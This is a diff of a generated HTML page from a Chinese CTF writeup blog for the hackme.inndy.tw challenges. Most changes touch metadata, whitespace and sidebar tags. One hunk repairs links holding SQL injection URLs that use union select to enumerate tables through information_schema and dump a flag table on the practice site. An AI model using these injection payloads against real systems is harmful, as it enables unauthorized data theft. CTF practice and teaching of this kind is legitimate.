@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">4.6k</span>阅读时长: <span class="post-count reading-time">24 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">4.6k</span>阅读时长: <span class="post-count reading-time">23 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -411,11 +411,11 @@ height:50vh;
 <p>既然提示有 <code>sqlmap</code> ，或许可以一把梭。</p>
 <p>先手注一波试试，发现没有任何过滤。</p>
 <p>有四个字段，看一下<strong>显位</strong>。</p>
-<p>[<a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,4]" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,4]</a>(<a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=0" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=0</a> union select 1,2,3,4)</p>
+<p><a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,4" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,4</a></p>
 <p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2jrbl15e9j20ls0aijrx.jpg" alt></p>
 <p>都有明显回显，直接上吧，盲注太慢。</p>
 <p><strong>拿到列名</strong></p>
-<p>[<a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()]" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()]</a>(<a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=0" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=0</a> union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database())</p>
+<p><a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()</a></p>
 <p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2jrl665y7j20ox0amq3k.jpg" alt></p>
 <p><strong>查询所有数据</strong></p>
 <p><a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(flag)%20from%20flag" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(flag)%20from%20flag</a></p>
@@ -623,7 +623,7 @@ height:50vh;
             <p>原文作者：<a href="https://wywwzjj.top">wywwzjj</a>
             </p><p>原文链接：<a href="https://wywwzjj.top/2019/02/02/Hackme-Writeup/">https://wywwzjj.top/2019/02/02/Hackme-Writeup/</a>
             </p><p>发表日期：<a href="https://wywwzjj.top/2019/02/02/Hackme-Writeup/">February 2nd 2019, 11:23:33 pm</a>
-            </p><p>更新日期：<a href="https://wywwzjj.top/2019/02/02/Hackme-Writeup/">May 19th 2019, 8:17:23 pm</a>
+            </p><p>更新日期：<a href="https://wywwzjj.top/2019/02/02/Hackme-Writeup/">May 19th 2019, 9:53:13 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -783,16 +783,6 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     
     
     
@@ -1435,9 +1425,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
     
-        <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
-    
         <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
+    
+        <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
     
         <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
     
@@ -1455,13 +1445,13 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
     
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
         <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
     
         <span class="sidebar-tag-name" data-tags="redis"><span class="iconfont-archer">&#xe606;</span>redis</span>
     
         <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
-    
-        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
     
         <span class="sidebar-tag-name" data-tags="笔记"><span class="iconfont-archer">&#xe606;</span>笔记</span>
     
